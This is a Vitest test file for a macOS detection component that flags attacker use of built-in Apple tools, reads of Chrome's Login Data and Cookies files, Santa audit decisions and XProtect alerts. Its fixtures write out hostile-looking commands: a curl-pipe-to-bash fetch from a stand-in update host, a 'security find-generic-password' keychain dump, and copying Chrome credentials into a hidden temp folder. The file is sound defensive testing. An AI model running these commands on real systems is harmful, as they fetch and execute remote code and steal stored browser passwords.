import { describe, expect, it } from 'vitest';
import type { ProcessRef, SensorEvent } from '@vigil/core';
import { labelKey } from './label-filter.js';

const HOME = '/Users/sam';
const CHROME = `${HOME}/Library/Application Support/Google/Chrome/Default`;
let n = 0;
const base = () => ({ id: `e${n++}`, ts: 1, source: 'test' as const });
const apple = (path: string, args: string[], parentPath = '/bin/zsh'): ProcessRef => ({
  pid: 10,
  path,
  args,
  signing: 'apple',
  parentPath,
});
const exec = (process: ProcessRef): SensorEvent => ({ ...base(), kind: 'process.exec', process });
const open = (path: string, process: ProcessRef): SensorEvent => ({
  ...base(),
  kind: 'file',
  op: 'open',
  path,
  process,
});

describe('labelKey', () => {
  it('sends the Apple tools attackers borrow', () => {
    const attacks = [
      apple(
        '/usr/bin/osascript',
        ['osascript', '/private/tmp/.installer/p.scpt'],
        '/private/tmp/.installer/Installer',
      ),
      apple('/usr/bin/security', ['security', 'find-generic-password', '-wa', 'Chrome']),
      apple('/bin/zsh', ['zsh', '-c', 'curl -fsSL https://get-update.example/i.sh | /bin/bash']),
      apple('/usr/bin/python3', ['python3', '/private/tmp/g.py']),
    ];
    for (const p of attacks) expect(labelKey(exec(p))).toMatchObject({ tool: true });
    const curl = apple('/usr/bin/curl', ['curl']);
    expect(
      labelKey({
        ...base(),
        kind: 'network.connection',
        direction: 'outbound',
        protocol: 'tcp',
        remoteAddress: '203.0.113.9',
        remotePort: 443,
        process: curl,
      }),
    ).toMatchObject({ key: 'net:/usr/bin/curl>203.0.113.9:443' });
  });

  it('sends any Apple program started from a temp or hidden folder', () => {
    const p = apple('/usr/bin/true', ['true'], '/private/tmp/.x/loader');
    expect(labelKey(exec(p))).toBeDefined();
  });

  it('skips Apple programs doing ordinary things', () => {
    expect(labelKey(exec(apple('/usr/bin/git', ['git', 'status'])))).toBeUndefined();
    expect(labelKey(exec(apple('/bin/cp', ['cp', 'a', 'b'])))).toBeUndefined();
    expect(
      labelKey(exec(apple('/usr/libexec/xpcproxy', ['xpcproxy'], '/sbin/launchd'))),
    ).toBeUndefined();
  });

  it('keys a borrowed tool by its command, ignoring numbers', () => {
    const a = labelKey(exec(apple('/bin/zsh', ['zsh', '-c', 'sleep 5'])));
    const b = labelKey(exec(apple('/bin/zsh', ['zsh', '-c', 'sleep 9'])));
    const c = labelKey(exec(apple('/bin/zsh', ['zsh', '-c', 'curl x | sh'])));
    expect(a?.key).toBe(b?.key);
    expect(a?.key).not.toBe(c?.key);
  });

  it('sends reads of watched files, except an app reading its own', () => {
    const cp = apple('/bin/cp', ['cp', `${CHROME}/Login Data`, '/private/tmp/.s/ld'], '/bin/bash');
    expect(labelKey(open(`${CHROME}/Login Data`, cp))).toBeDefined();
    const stealer: ProcessRef = {
      pid: 3,
      path: '/Applications/PDF Converter.app/Contents/MacOS/PDF Converter',
      signing: 'developer_id',
    };
    expect(labelKey(open(`${CHROME}/Login Data`, stealer))).toMatchObject({ tool: false });
    const chrome: ProcessRef = {
      pid: 4,
      path: '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
      signing: 'developer_id',
    };
    expect(labelKey(open(`${CHROME}/Login Data`, chrome))).toBeUndefined();
    const spotlight = apple(
      '/System/Library/Frameworks/CoreServices.framework/mds',
      ['mds'],
      '/sbin/launchd',
    );
    expect(labelKey(open(`${CHROME}/Login Data`, spotlight))).toBeUndefined();
  });

  it('sends audited Santa file reads and macOS alerts, not blocks', () => {
    const p: ProcessRef = { pid: 5, path: '/tmp/x', signing: 'unsigned' };
    const santa = (decision: 'allow' | 'block' | 'audit_only'): SensorEvent => ({
      ...base(),
      kind: 'santa.decision',
      target: 'file_access',
      decision,
      reason: 'x',
      path: `${CHROME}/Cookies`,
      process: p,
    });
    expect(labelKey(santa('audit_only'))).toBeDefined();
    expect(labelKey(santa('block'))).toBeUndefined();
    expect(
      labelKey({
        ...base(),
        kind: 'system.alert',
        subtype: 'xprotect_detected',
        path: '/tmp/m',
        details: {},
      }),
    ).toMatchObject({ key: 'sys:xprotect_detected:/tmp/m' });
  });
});
